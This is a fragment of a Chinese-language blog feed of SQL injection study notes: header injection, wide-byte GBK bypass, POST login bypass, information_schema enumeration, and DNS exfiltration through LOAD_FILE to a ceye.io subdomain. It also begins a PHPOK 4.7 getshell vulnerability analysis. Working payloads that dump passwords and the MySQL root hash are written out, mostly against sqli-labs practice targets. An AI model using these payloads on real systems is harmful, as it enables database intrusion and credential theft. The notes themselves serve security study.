title="Seay源码审计系统"></a>Seay源码审计系统</h3><p>常见功能简介：<br>1.代码自动高亮<br>2.可以自动审计（误报率高）<br>3.可以快速全局搜索<br>4.可以定位函数<br>5可以监控Mysql(插件)<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g3znttjhddj31fo0rpn5h.jpg" alt><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g3znu53w7bj31hb0rk792.jpg" alt></p><hr><p>这里我们只讲了代码审计的续篇，下一篇文章我们会开始进行代码审计、漏洞挖掘。</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>head头注入</title>
      <link href="/2019/12/07/sql_head/"/>
      <url>/2019/12/07/sql_head/</url>
      
        <content type="html"><![CDATA[<p><strong>在讲head注入之前，我们先来了解一些PHP的一些超全局变量，在php中有很多预定义的超全局变量，这就意味着他们在一个脚本的任何作用域都可用：</strong></p><p><strong>$_REQUEST:</strong>（获取get，post，cookie的传参，但在新版本中已无法获取cookie传参了）</p><p><strong>$_POST:</strong>（获取post传参）</p><p><strong>$_GET:</strong>(获取get的传参)</p><p><strong>$_COOKIE:</strong>(获取cookie的传参)</p><p><strong>$_SERVER</strong>(包含了诸如头信息(header),路径(path)等用户信息)</p><h3 id="转义函数"><a href="#转义函数" class="headerlink" title="转义函数"></a>转义函数</h3><p><strong>addslashes()</strong> 函数返回在预定义字符之前添加反斜杠的字符串。</p><p>预定义字符是：</p><ul><li>单引号（’）</li><li>双引号（”）</li><li>反斜杠（\）</li><li>NULL</li></ul><p>提示：该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串。</p><p>注释：默认地，PHP 对所有的 GET、POST 和 COOKIE 数据自动运行 addslashes()。所以您<br>不应对已转义过的字符串使用 addslashes()，因为这样会导致双层转义。</p><p>遇到这种情况时可以使用函数 get_magic_quotes_gpc() 进行检测。</p><p>语法：addslashes(string)</p><p>string 必需。规定要转义的字符串。</p><p>返回值： 返回已转义的字符串。</p><p>PHP 版本： 4+</p><ul><li>stripslashes()</li></ul><p>函数删除由 addslashes() 函数添加的反斜杠。</p><p> <strong>mysql_real_escape_string()</strong></p><p>函数转义 SQL 语句中使用的字符串中的特殊字符。<br>下列字符受影响：</p><ul><li><p>\x00</p></li><li><p>\n</p></li><li><p>\r</p></li><li><p>\</p></li><li><p>‘</p></li><li><p>“</p></li><li><p>\x1a</p></li></ul><p>如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。</p><p>语法：mysql_real_escape_string(string,connection)</p><p>string 必需。规定要转义的字符串。</p><p>connection 可选。规定 MySQL 连接。</p><p>如果未规定，则使用上一个连接。</p><p>说明：本函数将 string 中的特殊字符转义，并考虑到连接的当前字符集，因此可以安全用<br>于 mysql_query()。</p><h2 id="在这里我们用sqli-靶场less-18为例，"><a href="#在这里我们用sqli-靶场less-18为例，" class="headerlink" title="在这里我们用sqli-靶场less-18为例，"></a>在这里我们用sqli-靶场less-18为例，</h2><p>在此关源代码中我们看到代码中用check_input函数，对uname和passwd进行转义，所以不能在对username和password框进行注入了<br><img src="http://m.qpic.cn/psb?/V10ZDHQP2itaxQ/nwswSpT55o1rDq4PQUE4HrdNkta0ob3ZmTFzPVC*JSg!/b/dL8AAAAAAAAA&amp;bo=6QFKAAAAAAADF5A!&amp;rf=viewer_4" alt></p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP2itaxQ/i*8eUgB0PmYpObHDUHxSCd*Tm5FLKf2TZEARLVerTFE!/b/dLkAAAAAAAAA&amp;bo=QQJVAAAAAAADFyQ!&amp;rf=viewer_4" alt><br>在往下代码我们看到了插入语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&apos;$uagent&apos;,</span><br><span class="line">&apos;$IP&apos;, $uname)&quot;;</span><br></pre></td></tr></table></figure></p><p>这穿代码将user-agent和ip插入了数据库，而我们的控制点也是这两个，那我们是不是能利用user-agent和ip进行插入，我们可以通过抓包修改他的user-agent进而来进行注入</p><h4 id="我们先来说一下updatexml-函数"><a href="#我们先来说一下updatexml-函数" class="headerlink" title="我们先来说一下updatexml() 函数"></a>我们先来说一下<strong>updatexml() 函数</strong></h4><p><strong>语法：updatexml(目标xml文档，xml路径，更新的内容)</strong></p><p>updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)实际上这里是去更新了XML文档，但是我们在XML文档路径的位置里面写入了子查询，我们输入特殊字符，然后就因为不符合输入规则然后报错了但是报错的时候他其实已经执行了那个子查询语句！</p><p>(0x7e其实代表着16进制的”~”号，转换成16进制其实是为了过一些过滤，使得代码”兼容性”更高，<strong>其实~是为了让语法报错，让我们插入的子查询执行并通过报错带出来</strong>，其实只要能让语法错误的标点符号其实都是可以的)</p><p>也可以使用extractvalue（）函数，但低版本的mysql好像不支持这个函数；</p><h3 id="我们通过modheard这个插件来对user-agent进行修改"><a href="#我们通过modheard这个插件来对user-agent进行修改" class="headerlink" title="我们通过modheard这个插件来对user-agent进行修改"></a>我们通过modheard这个插件来对user-agent进行修改</h3><hr><p>我们先修改user-agent进行测试</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/q6bMPnwd5Da7o6uJLlJ1.yBautUyB39Idb5j8P42WaU!/b/dL8AAAAAAAAA&amp;bo=*QPdAAAAAAADBwE!&amp;rf=viewer_4" alt></p><p>发现插入成功！</p><p>那么我们就来开始构造payload进行注入：</p><ul><li>先查询数据库名：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and updatexml(1,concat(0x7e,(select database())),1),&apos;&apos;,&apos;&apos;)#</span><br></pre></td></tr></table></figure></li></ul><p>1’闭合前面，后面的两对闭合单引号是为了补充’$IP’, $uname两个数据位置；在将数据库后面语句注释掉</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/h5wItQlyqSf8q*fWEBZbyuxarCM9MsOS.gkgBK0AFo0!/b/dL4AAAAAAAAA&amp;bo=igSPAAAAAAADFzM!&amp;rf=viewer_4" alt></p><ul><li>查询表名</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;)),1),&apos;&apos;,&apos;&apos;)#</span><br></pre></td></tr></table></figure><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/6dP8GqUgFPrBrmBaR2CUU0UPLq4cOpZe1BXSsvGGRjs!/b/dFQBAAAAAAAA&amp;bo=PwZoAAAAAAADF2M!&amp;rf=viewer_4" alt></p><ul><li>查询字段名<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot;)),1),&apos;&apos;,&apos;&apos;)#</span><br></pre></td></tr></table></figure></li></ul><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/1*jz.Je1g7Y*Ky6011XcNEhXaffD0Mr6HN4hV9JpoLg!/b/dFYBAAAAAAAA&amp;bo=VwZ1AAAAAAADFxY!&amp;rf=viewer_4" alt></p><ul><li>爆用户名<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;and  updatexml(1,concat(0x7e,(select group_concat(password) from users)),1),&apos;&apos;,&apos;&apos;)#</span><br></pre></td></tr></table></figure></li></ul><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/.UxMQ7MiXCRxXQl1xnmZtDYwcUwVV8wZTNeYe0QlnII!/b/dL8AAAAAAAAA&amp;bo=8wTCAAAAAAADFwc!&amp;rf=viewer_4" alt></p><p>爆密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;and  updatexml(1,concat(0x7e,(select group_concat(password) from users)),1),&apos;&apos;,&apos;&apos;)#</span><br></pre></td></tr></table></figure></p><p> <img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/pAockMgFEAkgsrRs7qt12dZT3QgONi0fXpuStLt3Ils!/b/dDcBAAAAAAAA&amp;bo=hQTRAAAAAAADF2I!&amp;rf=viewer_4" alt></p><p>这样一次head头的注入就这样完成了，而后面靶场的head注入其实也是对其他head头（referer、cookie）进行注入而已，而注入的方法多种多样……</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>宽字节注入</title>
      <link href="/2019/12/07/sqlkzj/"/>
      <url>/2019/12/07/sqlkzj/</url>
      
        <content type="html"><![CDATA[<h3 id="宽字节sql注入的原理"><a href="#宽字节sql注入的原理" class="headerlink" title="宽字节sql注入的原理"></a>宽字节sql注入的原理</h3><p>gbk使用的是双字节编码,而utf8则是三字节。</p><ol><li><p>宽字节注入原因是设置的数据库编码和php编码是两个不同的编码，就可能产生宽字节注入漏洞</p></li><li><p>如果php编码为utf8,而sql语句set names gbk 这样配置可能会导致编码在转换时出现注入漏洞。</p></li><li><p>set names x.就等同设置了数据库连接，发出，接收的编码<br>(宽字节sql注入就是php在发送数据到数据库过程中使用了语句进行set names gbk或set claracter_set_client=gbk,但由于被一些字符集转换而导致宽字节注入)</p></li></ol><p>先引入一个php函数:</p><h3 id="megic-quotes-gpc-魔术信号开关"><a href="#megic-quotes-gpc-魔术信号开关" class="headerlink" title="megic_quotes_gpc(魔术信号开关):"></a><strong>megic_quotes_gpc(魔术信号开关):</strong></h3><p>当php传参时<strong>有特殊字符就会在前面加”\”来转译字符</strong> 来过滤，比如单引号，双引号，反斜线，null字符等都会被转义。(会对特殊字符进行转义)<br>在php作用是 <strong>判断解析用户输入的数据</strong>，包括post, get , cookie传过来的<strong>可疑数据增加转义字符</strong>如”\”,减少可疑数据对程序和数据库的影响而导致出错。 就是说<strong>如果有特殊字符，他就会在前面加一个反斜杠来进行过滤</strong>，那我们该如何绕过呢？</p><h2 id="绕过原理："><a href="#绕过原理：" class="headerlink" title="绕过原理："></a><strong>绕过原理：</strong></h2><p>在gbk编码中，\的编码为%5c,而中文字符”运”的编码为%df%5c,那么我们可不可以在这里做文章呢？</p><p>我们在使用引号去测试注入的时候，可能会被\转义:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">selet * from admin where &apos;id=1\&apos;&apos; limit 0,1</span><br></pre></td></tr></table></figure></p><p>被转义使我们无法进行注入，那我们能不能使用%df去和\编码%5c结合，变成一个运字，使得单引号闭合，’逃过’了被转义的命运。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">selet * from admin where &apos;id=-1%df%5c&apos; #&apos; limit 0,1</span><br></pre></td></tr></table></figure><p>转义变成：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">selet * from admin where &apos;id=-1运&apos; #&apos; limit 0,1</span><br></pre></td></tr></table></figure><p>转义后执行sql语句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">selet * from admin where &apos;id=-1运&apos; union select 1,user()#&apos; limit 0,1</span><br></pre></td></tr></table></figure></p><p>这是因为php和mysql使用了两种编码，使转码过程中出现漏洞。<br>如果我们输入%df”,而php的魔术引号会强制的转换”，在前面加反斜杠\”，而\等于%5c,则代码成为% df%5c”，而%df%5c编码为运字，变成运”，从而\转义字符被合并了，(从而绕过转义。)</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>post注入</title>
      <link href="/2019/12/07/sql2/"/>
      <url>/2019/12/07/sql2/</url>
      
        <content type="html"><![CDATA[<h3 id="post注入的介绍"><a href="#post注入的介绍" class="headerlink" title="post注入的介绍"></a>post注入的介绍</h3><p>post注入也是sql注入的一种类型，通过post进行传参的注入，post传参一般是通过表单的方式提交，但本质上和get注入没有多大的区别。通过伪造插入修改语句，使得用户插入的数据也被当成sql代码去执行。</p><h3 id="post注入的高危点"><a href="#post注入的高危点" class="headerlink" title="post注入的高危点**"></a>post注入的高危点**</h3><ul><li>网页登陆框</li><li>网页查询框</li><li>与数据库有交互的提交框</li></ul><p>一般情况下，当我们通过HTML表单提交数据到服务器时，服务端都会在数据库中检查我们输入的数据是否符合要求，然后根据数据库搜索结果返回相应的数据给客户端，但如果我们能控制输入，构造一些“恶意”的SQL语句，“欺骗”后台数据库执行系统不愿意用户执行的操作，那么就产生了SQL注入。这就是我们常说的POST注入。</p><p><strong>这里以sqli-less-11做post注入例题讲解：</strong></p><p>我们点进去，看到一张登陆的表单，我们思考一下应该如何进行注入</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/IQ8PuQYXRfQeKFbKXgUUpLG8c0u9bRyDxpMCb8JUO7A!/b/dLkAAAAAAAAA&amp;bo=3wSdAQAAAAADB2U!&amp;rf=viewer_4" alt></p><p>我们先通过用一个单引号在username上进行测试，发现出现错误信息，结果显示是对’的处理所产生的错误<br><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/.s0IqEEnc82GeYcsj6bUgw654mtuR57kW6RYZGKKnYU!/b/dFYBAAAAAAAA&amp;bo=8AWAAAAAAAADF0c!&amp;rf=viewer_4" alt></p><p>我们通过闭合’,在再后面加上or 1=1再将后面注释掉，竟然发现登陆了进去<br><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/kb0Ha8Mr6gvwbdZjJfLhBBPpydpnzihcImL2JKqDjP8!/b/dLYAAAAAAAAA&amp;bo=MwY0AgAAAAADJwE!&amp;rf=viewer_4" alt></p><p>这是为什么呢？显而易见，or ’1’ = ‘1’恒为真，而且#后面的密码直接被注释了，那么我们可以直接登录到后台了。<br>那我们能不能通过构造 get 注入中用到的其他的语句代替 or 1=1 进行注入。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; order by 3#</span><br></pre></td></tr></table></figure><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/4LkCwAdfoqRthpNHMTnA.EeKDTK*IDTWRjU7*WDKHX4!/b/dLYAAAAAAAAA&amp;bo=tgQRAgAAAAADJ6M!&amp;rf=viewer_4" alt><br>登陆失败，显示报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; order by 2#</span><br></pre></td></tr></table></figure><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/n8nIF5JiU1*uydG*pNEl36opJ4RjWDONYFA.ivtECCE!/b/dL8AAAAAAAAA&amp;bo=lAS0AQAAAAADJyc!&amp;rf=viewer_4" alt><br>登陆失败，无显示,说明字段为2。</p><p>我们尝试下猜数据库版本：<br><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/cdMGniPDlkmYnllHrJ8gvx8RMgPKV7bG.DcxpiXeJj8!/b/dFQBAAAAAAAA&amp;bo=jwGZAAAAAAADFyU!&amp;rf=viewer_4" alt></p><p>发现不仅登陆成功，并爆出了版本号<br><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/49Ye2S7pk7SkFSpT1If6A2IfwjT24AjCvEEdme0Plwg!/b/dFQBAAAAAAAA&amp;bo=QgPcAAAAAAADF68!&amp;rf=viewer_4" alt></p><p>这时的sql语句如下：<br><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/GQZ9l8h2oJXVpEu6vbrD87kOiB1DuduyH7aVTXGPsUQ!/b/dL4AAAAAAAAA&amp;bo=LAdfAAAAAAADF0Y!&amp;rf=viewer_4" alt><br>去数据库查询了username=1，但查询不到，则联合查询了后面的语句，爆出了数据库版本5.5.53；</p><p>在爆出数据库<br><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/JClWQRPGxeIFbUauSoQ2SczVYuSJmlM5JW.2AyJPhNY!/b/dLgAAAAAAAAA&amp;bo=RQfGAQAAAAADB6c!&amp;rf=viewer_4" alt></p><p>再通过系统库爆出表，字段，来进一步进行注入！</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sql注入原理分析</title>
      <link href="/2019/12/07/sql1/"/>
      <url>/2019/12/07/sql1/</url>
      
        <content type="html"><![CDATA[<h2 id="sql-injection介绍："><a href="#sql-injection介绍：" class="headerlink" title="sql injection介绍："></a>sql injection介绍：</h2><hr><p>我们称之为 sql 注入。何为 sql，英文：Structured Query Language，<br>叫做结构化查询语言。常见的结构化数据库有 MySQL，MS SQL ,Oracle 以及 Postgresql。Sql<br>语言就是我们在管理数据库时用到的一种。在我们的应用系统使用 sql 语句进行管理应用数<br>据库时，往往<code>采用拼接的方式形成一条完整的数据库语言，而危险的是，在拼接 sql 语句的<br>时候，我们可以改变 sql 语句。从而让数据执行我们想要执行的语句</code>，这就是我们常说的sql注入。</p><h2 id="sql注入原理："><a href="#sql注入原理：" class="headerlink" title="sql注入原理："></a>sql注入原理：</h2><hr><p><strong>sql注入攻击的原理</strong></p><p>就是将用户输出的数据当成代码然后被服务器放到数据库上去执行了。</p><p><strong>sql注入实现的两大条件</strong></p><p>1.用户能够控制输出.</p><p>2.原本程序要执行的代码，拼接了用户输入的数据</p><p><strong>SQL注入攻击的典型手段</strong></p><ol><li>判断应用程序是否存在注入漏洞</li><li>收集信息、并判断数据库类型</li><li>根据注入参数类型，重构SQL语句的原貌</li><li>猜解表名、字段名</li><li>获取账户信息、攻击web或为下一步攻击做准备</li></ol><p><strong>information_schema库</strong></p><p>information_schema库是php5.0以后自动生成的系统库，通常我们可以通过系统库查询到很多信息，比如information_schema库里面的tables表中就放着所有的表名，information_schema库里面的columns表放着所有列名。而数据库我们可以通过database()函数爆出也可以通过系统库的schemata库去查询。我们知道以上信息，就可以通过sql语句一步步爆出数据库隐密信息！</p><p><strong>一般的流程为：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select schema_name from information_schema.schemata</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select table_name from information_schema.tables where table_schema=&quot;数据库名&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select column_name from information_schema.columns where table_name=&quot;表名&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 字段名 from 表</span><br></pre></td></tr></table></figure><p><strong><em>SQL注入是怎么产生的？</em></strong></p><ol><li><p>WEB开发人员无法保证所有的输入都已经过滤</p></li><li><p>攻击者利用发送给SQL服务器的输入参数构造可执行的SQL代码（可加入到get请求、post请求、http头信息、cookie中）</p></li><li><p>数据库未做相应的安全配置</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>mysql-dns注入</title>
      <link href="/2019/12/07/sql-dnslog/"/>
      <url>/2019/12/07/sql-dnslog/</url>
      
        <content type="html"><![CDATA[<h2 id="dns注入的使用场景："><a href="#dns注入的使用场景：" class="headerlink" title="dns注入的使用场景："></a>dns注入的使用场景：</h2><p>在某些无法直接利用注入漏洞获得回显的情况下，但目标还是可以发起dns请求，这个时候我们就可以通过dns解析把获得的数据外带出去。</p><p>对于sql盲注通常是使用二分法去一步步猜，但是此方法繁琐不说，而且因为不断向服务器发送数据请求，而导致被ban，所以我们可以通过select<br>到的数据发送到一个url上，利用dns解析产生的记录日志来查看数据；</p><h2 id="dns使用函数解析："><a href="#dns使用函数解析：" class="headerlink" title="dns使用函数解析："></a>dns使用函数解析：</h2><ul><li><strong>load_file:</strong></li></ul><p>这是一个用来读取文件的函数（必须是root权限），读取文件并返回文件内容为字符串。要使用此函数，文件<strong>必须位于服务器主机上</strong>，必须<strong>指定完整路径的文件</strong>，而且<strong>必须有FILE权限</strong>。 该文件所有字节可读，但文件内容必须小于max_allowed_packetx(限制server接收数据包大小函数，默认是1MB)。<br>如果<strong>该文件不存在或无法读取，因为前面的条件之一不满足，函数返回 NULL。</strong><br>在MySQL5.0.19，character_set_filesystem系统变量控制文件名的解释，即仅作文字字符串。</p><hr><p><a href="http://ceye.io是一个免费的dnslog平台，（里面提供了如何操作和注入paylod）" target="_blank" rel="noopener">http://ceye.io是一个免费的dnslog平台，（里面提供了如何操作和注入paylod）</a></p><p>平台所给出的payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT LOAD_FILE(CONCAT(&apos;\\\\&apos;,(SELECT password FROM mysql.user WHERE user=&apos;root&apos; LIMIT 1),&apos;.yluzfg.ceye.io\\abc&apos;));</span><br></pre></td></tr></table></figure></p><p>执行之后:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&apos;\\root.yluzfg.ceye.io\abc&apos;)</span><br></pre></td></tr></table></figure><p>concat其实我们已经了解过了，通过他来拼接字符串。<br>而前面的\将后面的\转义了，所以只剩下两个’\’</p><p>而\开头加上网络路径正好形成了一个unc路径，这种也叫UNC路径访问法<br>通过命令去访问网上邻居。</p><p>实际上这句语句是数据库执行去访问root.yluzfg.ceye.io的共享文件夹abc，而ceye.io的子域名解析都是在某些服务器，然后记录了有人请求访问了root.yluzfg.ceye.io，然后通过日志在ceye这个平台上面显示出来了。</p><p>我们可以通过构造payloads来通过dns解析产生的记录日志并传到yece.io查询我们需要的信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and (select load_file(concat(&apos;\\\\&apos;,(select database()),&apos;.xxxxx.ceye.io\\abc&apos;)))#</span><br></pre></td></tr></table></figure><p>在通过ceye去查看我们所爆出的信息；<br><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/jP2FMP6IcA.s0t78L8v1AAEErEAqFFyX3mGTVvy9g8Y!/b/dL4AAAAAAAAA&amp;bo=lAOBAAAAAAADBzQ!&amp;rf=viewer_4" alt></p><p>就这样，通过一步步爆出数据库、表、字段等关键信息，对于有多个值，我们也可以通过移动偏移去一个个查看；</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHPOK 4.7从注入到getshell</title>
      <link href="/2019/12/07/PHPOK%204.7%E4%BB%8E%E6%B3%A8%E5%85%A5%E5%88%B0getshell/"/>
      <url>/2019/12/07/PHPOK%204.7%E4%BB%8E%E6%B3%A8%E5%85%A5%E5%88%B0getshell/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>phpok是一款PHP开发的开源企业网站系统。<br>在phpok 4.7版本及以前，存在一个由注入导致的前台getshell漏洞。<br>目前官方最新版已经修补。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在/framework/www/upload_control.php中第61行:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">private function upload_base($input_name=&apos;upfile&apos;,$cateid=0)</span><br><span class="line">    &#123;</span><br><span class="line">        $rs = $this-&gt;lib(&apos;upload&apos;)-&gt;getfile($input_name,$cateid);</span><br><span class="line">        if($rs[&quot;status&quot;] != &quot;ok&quot;)&#123;</span><br><span class="line">            return $rs;</span><br><span class="line">        &#125;</span><br><span class="line">        $array = array();</span><br><span class="line">        $array[&quot;cate_id&quot;] = $rs[&apos;cate&apos;][&apos;id&apos;];</span><br><span class="line">        $array[&quot;folder&quot;] = $rs[&apos;folder&apos;];</span><br><span class="line">        $array[&quot;name&quot;] = basename($rs[&apos;filename&apos;]);</span><br><span class="line">        $array[&quot;ext&quot;] = $rs[&apos;ext&apos;];</span><br><span class="line">        $array[&quot;filename&quot;] = $rs[&apos;filename&apos;];</span><br><span class="line">        $array[&quot;addtime&quot;] = $this-&gt;time;</span><br><span class="line">        $array[&quot;title&quot;] = $rs[&apos;title&apos;];</span><br><span class="line">        $array[&apos;session_id&apos;] = $this-&gt;session-&gt;sessid();</span><br><span class="line">        $array[&apos;user_id&apos;] = $this-&gt;session-&gt;val(&apos;user_id&apos;);</span><br><span class="line">        $arraylist = array(&quot;jpg&quot;,&quot;gif&quot;,&quot;png&quot;,&quot;jpeg&quot;);</span><br><span class="line">        if(in_array($rs[&quot;ext&quot;],$arraylist))&#123;</span><br><span class="line">            $img_ext = getimagesize($this-&gt;dir_root.$rs[&apos;filename&apos;]);</span><br><span class="line">            $my_ext = array(&quot;width&quot;=&gt;$img_ext[0],&quot;height&quot;=&gt;$img_ext[1]);</span><br><span class="line">            $array[&quot;attr&quot;] = serialize($my_ext);</span><br><span class="line">        &#125;</span><br><span class="line">        $id = $this-&gt;model(&apos;res&apos;)-&gt;save($array);</span><br><span class="line">        if(!$id)&#123;</span><br><span class="line">            $this-&gt;lib(&apos;file&apos;)-&gt;rm($this-&gt;dir_root.$rs[&apos;filename&apos;]);</span><br><span class="line">            return array(&apos;status&apos;=&gt;&apos;error&apos;,&apos;error&apos;=&gt;P_Lang(&apos;图片存储失败&apos;));</span><br><span class="line">        &#125;</span><br><span class="line">        $this-&gt;model(&apos;res&apos;)-&gt;gd_update($id);</span><br><span class="line">        $rs = $this-&gt;model(&apos;res&apos;)-&gt;get_one($id);</span><br><span class="line">        $rs[&quot;status&quot;] = &quot;ok&quot;;</span><br><span class="line">        return $rs;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这是一个文件上传函数，然后在该函数开头又调用了getfile函数，跟进:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">public function getfile($input=&apos;upfile&apos;,$cateid=0)</span><br><span class="line">    &#123;</span><br><span class="line">        if(!$input)&#123;</span><br><span class="line">            return array(&apos;status&apos;=&gt;&apos;error&apos;,&apos;content&apos;=&gt;P_Lang(&apos;未指定表单名称&apos;));</span><br><span class="line">        &#125;</span><br><span class="line">        $this-&gt;_cate($cateid);</span><br><span class="line">        if(isset($_FILES[$input]))&#123;</span><br><span class="line">            $rs = $this-&gt;_upload($input);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $rs = $this-&gt;_save($input);</span><br><span class="line">        &#125;</span><br><span class="line">        if($rs[&apos;status&apos;] != &apos;ok&apos;)&#123;</span><br><span class="line">            return $rs;</span><br><span class="line">        &#125;</span><br><span class="line">        $rs[&apos;cate&apos;] = $this-&gt;cate;</span><br><span class="line">        return $rs;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>如果存在上传文件就调用_upload函数，继续跟进:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span 